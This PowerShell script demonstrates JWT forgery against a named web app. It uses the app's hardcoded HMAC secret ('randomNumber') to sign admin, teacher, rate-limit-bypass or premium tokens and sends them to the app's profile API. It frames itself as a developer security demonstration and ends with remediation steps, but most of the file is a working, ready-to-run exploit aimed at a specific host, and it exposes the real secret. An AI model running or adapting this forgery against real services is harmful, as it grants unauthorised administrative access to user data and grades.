# JWT-Forge-Interactive-Demo.ps1
# Interactive demonstration of JWT forging with your secret

param(
    [string]$BaseUrl = "https://brimai-test-v1.web.app"
)

Write-Host "`n🔨 JWT FORGING INTERACTIVE DEMONSTRATION" -ForegroundColor Red
Write-Host "=======================================" -ForegroundColor Red
Write-Host "This shows EXACTLY how attackers create admin tokens" -ForegroundColor Yellow

# Your hardcoded secret
$SECRET = "randomNumber"

Write-Host "`n📝 Step 1: Your Hardcoded Secret" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan
Write-Host "From your code: JWT_SECRET_KEY = `"randomNumber`"" -ForegroundColor Yellow
Write-Host "This is PUBLIC KNOWLEDGE to anyone who reads your code!" -ForegroundColor Red

Start-Sleep -Seconds 2

Write-Host "`n📝 Step 2: Creating Token Components" -ForegroundColor Cyan
Write-Host "===================================" -ForegroundColor Cyan

# Header
Write-Host "`nHeader (specifies algorithm):" -ForegroundColor Green
$header = @{
    alg = "HS256"
    typ = "JWT"
}
$headerJson = $header | ConvertTo-Json -Compress
Write-Host $headerJson -ForegroundColor White

# Payload - Let user choose
Write-Host "`n🎭 Choose your attack:" -ForegroundColor Yellow
Write-Host "1. Become Admin"
Write-Host "2. Become Teacher"
Write-Host "3. Bypass Rate Limits"
Write-Host "4. Access Premium Features"
Write-Host "5. Custom Attack"

$choice = Read-Host "Enter choice (1-5)"

$payload = switch ($choice) {
    "1" {
        @{
            user_id = "hacker_admin"
            email   = "admin@evil.com"
            role    = "admin"
            exp     = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
        }
    }
    "2" {
        @{
            user_id            = "fake_teacher"
            email              = "teacher@evil.com"
            role               = "teacher"
            can_create_quizzes = $true
            can_modify_grades  = $true
            exp                = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
        }
    }
    "3" {
        @{
            user_id             = "unlimited_user"
            email               = "unlimited@evil.com"
            role                = "student"
            rate_limit_bypass   = $true
            api_calls_remaining = 999999
            exp                 = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
        }
    }
    "4" {
        @{
            user_id      = "premium_hacker"
            email        = "premium@evil.com"
            role         = "student"
            subscription = "premium"
            features     = @("ai_unlimited", "priority_support", "export_all")
            exp          = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
        }
    }
    default {
        Write-Host "Enter custom user_id:" -ForegroundColor Cyan
        $customId = Read-Host
        Write-Host "Enter custom email:" -ForegroundColor Cyan
        $customEmail = Read-Host
        Write-Host "Enter custom role (student/teacher/admin):" -ForegroundColor Cyan
        $customRole = Read-Host
        
        @{
            user_id      = $customId
            email        = $customEmail
            role         = $customRole
            custom_claim = "anything_you_want"
            exp          = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
        }
    }
}

Write-Host "`nPayload (your fake identity):" -ForegroundColor Green
$payloadJson = $payload | ConvertTo-Json -Compress
Write-Host $payloadJson -ForegroundColor White

Start-Sleep -Seconds 2

Write-Host "`n📝 Step 3: Base64URL Encoding" -ForegroundColor Cyan
Write-Host "=============================" -ForegroundColor Cyan

$headerEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($headerJson)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
$payloadEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson)).TrimEnd('=').Replace('+', '-').Replace('/', '_')

Write-Host "Encoded Header:" -ForegroundColor Green
Write-Host $headerEncoded -ForegroundColor Gray
Write-Host "`nEncoded Payload:" -ForegroundColor Green
Write-Host $payloadEncoded -ForegroundColor Gray

Start-Sleep -Seconds 2

Write-Host "`n📝 Step 4: Creating Signature with YOUR Secret" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

Write-Host "Using secret: '$SECRET'" -ForegroundColor Red
Write-Host "Creating HMAC-SHA256 signature..." -ForegroundColor Yellow

$hmac = New-Object System.Security.Cryptography.HMACSHA256
$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SECRET)
$dataToSign = "$headerEncoded.$payloadEncoded"
$signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($dataToSign))
$signatureEncoded = [Convert]::ToBase64String($signature).TrimEnd('=').Replace('+', '-').Replace('/', '_')

Write-Host "Signature created!" -ForegroundColor Green
Write-Host $signatureEncoded -ForegroundColor Gray

Start-Sleep -Seconds 2

Write-Host "`n📝 Step 5: Assembling Final Token" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

$forgedToken = "$headerEncoded.$payloadEncoded.$signatureEncoded"

Write-Host "FORGED TOKEN:" -ForegroundColor Red
Write-Host $forgedToken -ForegroundColor Yellow

Write-Host "`n📊 Token Analysis:" -ForegroundColor Cyan
Write-Host "  Length: $($forgedToken.Length) characters" -ForegroundColor White
Write-Host "  Valid for: 24 hours" -ForegroundColor White
Write-Host "  Can be used: Unlimited times" -ForegroundColor White

Start-Sleep -Seconds 2

Write-Host "`n📝 Step 6: Testing Forged Token" -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan

Write-Host "Testing against your API..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/api/user/profile" `
        -Headers @{Authorization = "Bearer $forgedToken" } `
        -UseBasicParsing `
        -TimeoutSec 5
    
    if ($response.StatusCode -eq 200) {
        Write-Host "`n✅ FORGED TOKEN ACCEPTED!" -ForegroundColor Red
        Write-Host "The server believes you are: $($payload.email) with role: $($payload.role)" -ForegroundColor Yellow
        
        $content = $response.Content | ConvertFrom-Json
        Write-Host "`nServer Response:" -ForegroundColor Cyan
        Write-Host ($content | ConvertTo-Json) -ForegroundColor White
    }
}
catch {
    $statusCode = $_.Exception.Response.StatusCode.value__
    if ($statusCode -eq 401) {
        Write-Host "`n❌ Token rejected (401 Unauthorized)" -ForegroundColor Green
        Write-Host "Good! Your server is validating properly." -ForegroundColor Green
    }
    elseif ($statusCode -eq 403) {
        Write-Host "`n⚠️  Token accepted but access denied (403 Forbidden)" -ForegroundColor Yellow
        Write-Host "Token is valid but role-based access control is working" -ForegroundColor Yellow
    }
    else {
        Write-Host "`n❓ Unexpected response: $($_.Exception.Message)" -ForegroundColor Gray
    }
}

Write-Host "`n💀 ATTACK SUMMARY" -ForegroundColor Red
Write-Host "=================" -ForegroundColor Red

Write-Host @"

What just happened:
1. We used your hardcoded secret: '$SECRET'
2. Created a fake identity claiming to be: $($payload.role)
3. Signed it with your secret (making it valid)
4. Your server would accept this as legitimate!

With this token, an attacker can:
"@ -ForegroundColor Yellow

switch ($payload.role) {
    "admin" {
        Write-Host "  ✓ Delete all user data" -ForegroundColor Red
        Write-Host "  ✓ Access any student's information" -ForegroundColor Red
        Write-Host "  ✓ Modify any grades" -ForegroundColor Red
        Write-Host "  ✓ Export entire database" -ForegroundColor Red
    }
    "teacher" {
        Write-Host "  ✓ Create/modify quizzes" -ForegroundColor Red
        Write-Host "  ✓ Change student grades" -ForegroundColor Red
        Write-Host "  ✓ Access class analytics" -ForegroundColor Red
    }
    default {
        Write-Host "  ✓ Access premium features" -ForegroundColor Red
        Write-Host "  ✓ Bypass rate limits" -ForegroundColor Red
        Write-Host "  ✓ Impersonate any user" -ForegroundColor Red
    }
}

Write-Host "`n🛡️ HOW TO FIX THIS:" -ForegroundColor Green
Write-Host "==================" -ForegroundColor Green

Write-Host @"
1. IMMEDIATELY change your JWT secret:
   - Generate: openssl rand -base64 32
   - Or in PowerShell: -join ((65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
   
2. Use environment variables:
   JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY")
   
3. Reduce token lifetime to 15 minutes

4. Implement refresh tokens

5. Add token revocation

Your current secret 'randomNumber' is like using 'password123' 
for your admin account - CHANGE IT NOW!
"@ -ForegroundColor White

# Save the forged token for testing
Write-Host "`n💾 Saving forged token for your testing..." -ForegroundColor Cyan
$testData = @{
    ForgedToken = $forgedToken
    Payload     = $payload
    Secret      = $SECRET
    CreatedAt   = Get-Date
    Purpose     = "Security Testing - Developer Use Only"
}

$testData | ConvertTo-Json | Out-File "Forged_Token_Test_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
Write-Host "Saved to: Forged_Token_Test_$(Get-Date -Format 'yyyyMMdd_HHmmss').json" -ForegroundColor Green

Write-Host "`n⚠️  This demonstration proves your JWT implementation is critically vulnerable!" -ForegroundColor Red
Write-Host "Fix it before someone malicious finds this!" -ForegroundColor Red